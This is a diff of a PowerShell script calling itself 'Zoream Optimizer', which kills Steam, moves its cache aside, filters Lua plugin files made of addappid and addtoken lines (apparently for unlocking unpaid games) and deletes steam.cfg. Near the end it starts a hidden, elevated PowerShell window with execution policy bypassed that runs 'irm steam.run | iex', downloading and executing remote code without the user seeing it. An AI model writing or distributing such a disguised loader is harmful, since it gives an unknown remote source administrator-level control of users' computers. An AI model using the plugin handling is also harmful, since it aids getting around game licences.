@@ -26,7 +26,7 @@ $host.UI.RawUI.ForegroundColor = "White"
 $host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
 Clear-Host
 
-# -------------------- 1. ADMIN CHECK (FORCE CONHOST) --------------------
+# -------------------- 1. ADMIN CHECK --------------------
 $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object Security.Principal.WindowsPrincipal($identity)
 $isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -44,9 +44,8 @@ if (-not $isAdmin) {
 
 Disable-QuickEdit
 
-# -------------------- 2. UI HELPER FUNCTIONS --------------------
+# -------------------- 2. UI HELPERS --------------------
 function Show-Header {
-    Clear-Host
     Write-Host " "
     Write-Host "   ███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███╗   ███╗" -ForegroundColor Cyan
     Write-Host "   ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║" -ForegroundColor Cyan
@@ -72,71 +71,101 @@ function Write-Log {
     }
 }
 
-# -------------------- 3. MAIN OPERATIONS --------------------
+# -------------------- 3. MAIN LOGIC --------------------
+Clear-Host
 Show-Header
 Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"
 
-Write-Log "Searching for Steam installation..." "STEP"
-try {
-    $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction Stop).InstallPath
-} catch { $steamPath = $null }
+# Find Steam
+try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
+if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }
 
-if (-not $steamPath -or -not (Test-Path $steamPath)) {
-    Write-Log "Steam path not found in Registry." "ERROR"; exit 1
-}
-Write-Log "Steam located at: $steamPath" "SUCCESS"
 
-Write-Log "Sending Steam ClearBeta command..." "STEP"
+# Reset Steam Beta & Terminate
+Write-Log "Resetting Steam & Killing Processes..." "STEP"
 Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
-Start-Sleep -Seconds 4
+Start-Sleep -Seconds 2
+Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force
 
-Write-Log "Terminating Steam processes..." "STEP"
-Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
-Get-Process -Name "steam*" -ErrorAction SilentlyContinue | Stop-Process -Force
-Write-Log "Steam has been fully stopped." "SUCCESS"
-
+# Cache Cleaning
 $backupPath = Join-Path $steamPath "cache-backup"
 New-Item -ItemType Directory -Path $backupPath -Force | Out-Null
-
 if (Test-Path (Join-Path $steamPath "appcache")) {
-    Write-Log "Cleaning AppCache..." "INFO"
     Move-Item (Join-Path $steamPath "appcache") (Join-Path $backupPath "appcache") -Force -ErrorAction SilentlyContinue
 }
 
-$userdataPath = Join-Path $steamPath "userdata"
-if (Test-Path $userdataPath) {
-    Write-Log "Optimizing user data..." "INFO"
-    foreach ($user in Get-ChildItem $userdataPath -Directory) {
-        $config = Join-Path $user.FullName "config"
-        if (Test-Path $config) {
-            $uBack = Join-Path $backupPath ("userdata\" + $user.Name)
-            New-Item -ItemType Directory -Path $uBack -Force | Out-Null
-            Move-Item $config $uBack -Force -ErrorAction SilentlyContinue
-            New-Item -ItemType Directory -Path $config -Force | Out-Null
-            if (Test-Path (Join-Path $uBack "config\localconfig.vdf")) {
-                Copy-Item (Join-Path $uBack "config\localconfig.vdf") (Join-Path $config "localconfig.vdf") -Force
+# --- PLUGIN VALIDATION & AUTO-CLEAN ---
+Write-Log "Validating and Cleaning stplug-in folder..." "STEP"
+$stpluginPath = Join-Path $steamPath "config\stplug-in"
+
+if (-not (Test-Path $stpluginPath)) {
+    Write-Log "stplug-in folder does not exist!" "WARN"
+} else {
+    # 1. Non-Lua File Cleanup
+    Get-ChildItem $stpluginPath -File | ForEach-Object {
+        if ($_.Extension -ne ".lua") {
+            Write-Log "Removing non-lua file: $($_.Name)" "ERROR"
+            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    # Validation Function
+    function Test-ValidLuaLine {
+        param([string]$Line)
+        $trimmed = $Line.Trim()
+        if ([string]::IsNullOrWhiteSpace($trimmed) -or $trimmed.StartsWith('-')) { return $true }
+        if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
+            if ($trimmed -match '\(' -and $trimmed -match '\)') { return $true }
+        }
+        return $false
+    }
+
+    # 2. Invalid Lua Content Cleanup
+    Get-ChildItem $stpluginPath -Filter "*.lua" | ForEach-Object {
+        $lines = Get-Content $_.FullName
+        $isClean = $true
+        foreach ($l in $lines) {
+            if (-not (Test-ValidLuaLine $l)) { 
+                $isClean = $false
+                break 
             }
+        }
+        
+        if ($isClean) { 
+            Write-Log "Validated: $($_.Name)" "SUCCESS" 
+        } else { 
+            Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR" 
+            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
         }
     }
 }
 
-# -------------------- 4. FINAL & HIDDEN BACKGROUND EXECUTION --------------------
-Clear-Host
-Show-Header
+# Delete steam.cfg
+Write-Log "Checking for steam.cfg..." "STEP"
+$cfgFiles = @("steam.cfg", "Steam.cfg")
+foreach ($cfg in $cfgFiles) {
+    $targetCfg = Join-Path $steamPath $cfg
+    if (Test-Path $targetCfg) {
+        Remove-Item $targetCfg -Force -ErrorAction SilentlyContinue
+        Write-Log "Deleted: $cfg" "SUCCESS"
+    }
+}
+
+# -------------------- 4. FINAL & HIDDEN EXECUTION --------------------
+
+Write-Log "Fix & Cleanup complete." "SUCCESS"
 Write-Host " "
-Write-Log "Fix complete." "SUCCESS"
+Write-Host "   >>> CORE EXECUTING IN BACKGROUND <<<" -ForegroundColor Cyan
 Write-Host " "
 
-# 'steam.run'ı gizli bir pencerede (Admin yetkisiyle) başlatır
+# Background Execute steam.run
 $command = "irm steam.run | iex"
 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden
 
-# Dinamik Geri Sayım Döngüsü
+# Geri Sayım
 for ($i = 5; $i -gt 0; $i--) {
-    # `r (carriage return) imleci satırın başına döndürür, böylece yazı üst üste binmez
     Write-Host "`r   >>> This window will close in $i second(s) <<<  " -ForegroundColor Magenta -NoNewline
     Start-Sleep -Seconds 1
 }
-
 
 exit
